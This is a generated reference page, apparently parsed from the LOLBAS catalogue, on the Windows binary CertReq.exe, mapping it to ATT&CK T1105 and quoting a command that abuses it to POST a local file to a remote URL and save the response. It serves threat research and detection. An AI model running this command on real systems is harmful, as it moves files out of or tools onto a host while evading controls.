---
parsed_by: focuslocust
source: lolbas
type: generated
---
# CertReq.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `certreq.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certreq.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Used for requesting and managing certificates

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/certreq.md)
- Source verification: [source record](../../sources/lolbas/certreq.exe.md)

## Aliases

- `CertReq.exe`
- `certreq.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/certreq.exe.md)

## Source Verification

[source record](../../sources/lolbas/certreq.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@dtmsecurity'
Person: David Middlehurst
Author: David Middlehurst
Commands:
- Category: Download
Command: CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}
Description: Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to
```
